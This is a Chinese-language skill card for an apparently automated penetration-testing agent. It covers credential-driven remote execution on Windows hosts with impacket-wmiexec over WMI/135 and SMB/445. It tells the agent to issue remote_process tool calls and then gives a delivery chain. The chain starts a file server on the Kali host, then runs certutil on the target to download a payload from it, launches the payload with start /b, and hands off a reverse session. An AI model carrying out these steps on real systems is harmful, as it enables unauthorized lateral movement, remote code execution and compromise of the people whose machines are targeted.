---
name: impacket-wmiexec-cmd
handover: runtime
description: impacket-wmiexec — 凭据驱动的 WMI 远程执行（T1021.006 · wmi/135 + smb/445）
metadata:
  predicates:
  - T1021.006
  - smb
  - T1021
  platforms:
  - linux
  - windows
  keywords:
  - exploit.impacket_wmiexec_cmd
  - method
  - position
  - tool
  - cmd
  - msf
  - T1021.006
  - impacket
  - wmiexec
  resources: []
  categories:
  - action-method
  aliases:
  - wmiexec
  - impacket
  - wmi
  parameters:
  - host
  - credential
  when:
    service: smb
  requires: []
  excludes: []
  carriers:
  - kali
  - shell
serves:
- smb
- windowsCredentialRemoteExecution
---

## 适用场景

卡片 ID：`exploit.impacket_wmiexec_cmd`。目标为 Windows，135（DCOM/RPC）可达，凭据有远程 WMI 权限；stdout 经 445 的 `ADMIN$` 取回，需要明文口令或 NT hash，不要求目标已有会话。
执行点为能到目标 135/445 的工具机（如 Kali），须有 `impacket-wmiexec`（`wmiexec.py`）；目标侧使用 `cmd`、`hostname`、`whoami`。
与 `exploit.impacket_psexec_cmd` 都验证远程执行及实际身份；psexec 经 SCM 创建服务并投递可执行体，本卡经 WMI。遵循本步已选卡与各自前提，不将两种方法混用。
图提供 `target_host`、`credential_ref`，运行侧提供可选 `source_ref`、`credential_candidates`；输入见冻结卡面，不得杜撰未提供材料。

## 参数

- 输入 `target_host`：来自 graph
- 输入 `credential_ref`：来自 graph
- 输入 `credential_candidates`：来自 runtime（可选）
- 输入 `source_ref`：来自 runtime（可选）
- 交付：evidence
- 执行位置：position
- 可用工具：tool、cmd、msf
- 图适用：technique=T1021.006

## 步骤

**进入条件（先看这条）**：本卡需要「适用场景」里声明的输入（目标、地址/端口、平台、执行面）已经由运行层给出；缺输入就先说明缺什么，不要换方法硬凑，也不要去起监听或新建会话。

**一条一个动作块**：一次答复只给一个请求；不拼长行、不发数组、不把多步塞进一条命令。

**凭据与远程执行由运行层完成。** 需要认证时只发：
```text
{"tool":"remote_process","target":"kali","arguments":{"host":"<host>","command":"<一条 Windows 命令行>","credential_ref":"<运行层给出的引用>","method":"wmiexec"}}
```
运行层解析凭据并执行 impacket-wmiexec；模型不写 `<password>`、`<nthash>` 或任何明文/哈希。
Windows 命令一律用 `run_command`（本步绑定的会话）或 `remote_process`（需要凭据的远程执行）；回执里没有原始输出时判 `uncertain`。

**节点要求会话时（本节点产出 `execCode(...)`，必须交一条会话）**：命令回显只证明能执行，**不能替代会话**。一步一发：

**监听与弹头由运行层预置（本卡不再造子弹、不再起监听）**：运行层已按目标平台选好`delivery_payload`、分配回调端口、武装 handler，并用同一 payload 和同一端口生成了弹头。本卡只使用 `delivery_stager_path`、`delivery_artifact_url`、`delivery_remote_path`、`delivery_callback_host`、`delivery_callback_port`。

6. **起取件台（`cmd`，在控制端）**：`{"tool":"serve_file","target":"kali","arguments":{"directory":"<delivery_work_dir>","port":<delivery_fetch_port>}}`。
7. **用远程执行取件并起载荷（一发）**：用 `remote_process`，`method=wmiexec`，`command` 为 `cmd /c "certutil -urlcache -f <delivery_artifact_url> <delivery_remote_path> & start /b <delivery_remote_path> & echo agv-payload-started"`；回执须能看出下载成功且含 `agv-payload-started`。
8. **收尾**：引本次回执 → `finish`；**会话由运行层认领、登记并探活，本卡不自己登记**。

**本卡的完成依据是「交付段」最后一步的回执**（载荷被目标取到并启动 / 会话已交付）：命令回显、PoC 成功、文件读取、身份证据都只是**中间观察**，**不能**用来判 `action_complete=true`。拿到交付段最后一步的回执即判 `passed` 且 `action_complete=true`，**不要再追加任何「确认会话」的探测**（监听列表、连接数、端口都不是完成依据）；会话的认领、登记与探活由运行层负责，它认领不到会**如实记录未确认**，那不是让你在本卡里继续试的理由。

**停止边界**：本卡一次调用只做本页列出的动作；完成即结束，不由本卡重试、追加动作、换通道或改变判据。


## 完成依据

本卡依次核对 freshness、target、identity，不另外声明效果事实；最终图事实由独立 verifier 核对。
- freshness：原始输出属于本次登记调用，与运行层外层标记和回执对应；远端分段前缀不能单独证明新鲜性。
- target：marker 块内 `hostname` 与节点目标一致。
- identity：`whoami` / `whoami /user` 形成的 `identity_name`、`identity_sid` 达到节点要求。
证据为 `call_id`、`hostname`、`identity_name`、`identity_sid`、`exit_code` 及原始 `stdout`、`stderr`；取不到退出码就不写，不默认为 0。
`finish.verdict` 判断本卡远程执行与身份事实，不判断工具是否完成；只引用本次回执，退出码零或引文可核对均不能代替三闸。
- `pass`：三个阻断闸均通过。
- `unsatisfied`：完整、绑定正确的本次回执明确否定要求，例如实际身份低于节点要求；已有阻断闸明确不满足时不被其它不确定项覆盖。
- `uncertain`：没有已确认的否定事实，但证据缺失、绑定不明或权限不足导致无法核对；不把缺证据判成不满足，不猜填。

## 失败条件

外层 `cmd.exe /Q /c` 将输出重定向到 `ADMIN$` 临时文件，`&` 链重定向可能只覆盖末条命令；保留内层 `cmd /c`，否则可能只取回末尾标记。
Impacket 0.11 的 `-p` 是 `-path` / `-port` 歧义前缀，usage 错误发生在触网前；口令写目标串，哈希走 `-hashes`。
只开 445、135 不通是执行前提不足，不能据此认定目标没有 WMI 能力。`ADMIN$` 回收会留下共享访问痕迹；按环境选卡，不固定宣称某种方法更强。
明文口令可能被本地 `ps` 看见，沿用 flag 与显式清单脱敏。
**失败回环由编排换卡，不擅改卡内方法；保留调用及部分输出，按通用异常与恢复契约处理。**

[共享执行规则](../../src/skills/templates/execution_rules.txt)

**停止边界**：本卡一次调用只做本页列出的动作；完成即结束，不由本卡重试、追加动作、换通道或改变判据。
